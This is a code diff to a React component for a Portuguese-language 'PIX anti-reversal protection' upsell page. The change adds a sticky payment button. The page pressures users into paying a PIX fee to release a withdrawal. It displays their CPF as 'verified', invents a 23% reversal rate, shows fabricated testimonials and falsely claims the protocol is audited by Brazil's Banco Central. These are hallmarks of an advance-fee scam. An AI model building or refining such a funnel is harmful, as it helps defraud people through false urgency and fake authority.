@@ -1,5 +1,6 @@
 import { useState } from "react";
 import { Loader2, Check, ChevronDown, ChevronUp } from "lucide-react";
+import StickyCtaBar from "./StickyCtaBar";
 import testimonial1 from "@/assets/testimonial-1.jpg";
 import testimonial2 from "@/assets/testimonial-2.jpg";
 import testimonial3 from "@/assets/testimonial-3.jpg";
@@ -12,7 +13,7 @@ const FunnelUpsellAntiReversao = ({ balance, onGeneratePix, isGenerating, leadCp
   return (
     <div className="fixed inset-0 z-[80] bg-[#F0F2F5] overflow-y-auto">
       <div className="bg-[#D32F2F] py-3 px-4"><h1 className="text-white text-sm font-bold text-center tracking-wide flex items-center justify-center gap-2">🛡️ PROTEÇÃO ANTI-REVERSÃO PIX</h1></div>
-      <main className="px-3 py-4 max-w-lg mx-auto">
+      <main className="px-3 py-4 max-w-lg mx-auto pb-24">
         {leadCpf && (<div className="bg-white rounded-xl p-3 mb-3 shadow-sm flex items-center gap-3 border border-green-100"><div className="w-8 h-8 rounded-full bg-green-50 flex items-center justify-center shrink-0"><span className="text-sm">🪪</span></div><div className="flex-1"><p className="text-gray-800 text-xs font-semibold">{leadName || "Titular"}</p><p className="text-gray-400 text-[11px]">CPF: {leadCpf}</p></div><span className="text-green-600 text-[10px] font-bold">Verificado ✓</span></div>)}
         <div className="bg-[#FFEBEE] border border-[#EF5350] rounded-xl p-4 mb-3"><div className="flex items-start gap-2"><span className="text-lg leading-none mt-0.5">⚠️</span><div><p className="text-gray-900 text-sm font-bold mb-1">Risco de Reversão Detectado</p><p className="text-gray-700 text-xs leading-relaxed">Nos últimos 7 dias, <span className="font-bold text-red-700">23% dos saques</span> sem proteção foram revertidos automaticamente.</p></div></div></div>
         <div className="bg-white rounded-xl p-5 shadow-sm mb-3">
@@ -29,6 +30,7 @@ const FunnelUpsellAntiReversao = ({ balance, onGeneratePix, isGenerating, leadCp
         <div className="mb-3"><p className="text-gray-600 text-xs font-bold text-center mb-2">Quem ativou, recebeu sem problemas</p><div className="space-y-2"><TestimonialCard img={testimonial1} name="Roberto M." location="São Paulo, SP" text="Na primeira vez que saquei sem proteção, deu reversão. Dessa vez ativei e caiu em 1 minuto." amount={balance} /><TestimonialCard img={testimonial2} name="Fernanda L." location="Salvador, BA" text="Minha amiga teve o PIX revertido. Eu ativei a proteção e recebi tudo certinho." amount={balance} /><TestimonialCard img={testimonial3} name="Diego S." location="Porto Alegre, RS" text="Achei que era bobeira, mas depois de ver gente perdendo saque por reversão, ativei na hora." amount={balance} /></div></div>
         <div className="text-center pb-6"><p className="text-gray-400 text-[10px]">Protocolo de proteção auditado pelo Banco Central</p></div>
       </main>
+      <StickyCtaBar onClick={onGeneratePix} isGenerating={isGenerating} label={"Proteger Meu Saque de " + balance} bgColor="bg-[#D32F2F]" shadowColor="shadow-red-200" />
     </div>
   );
 };
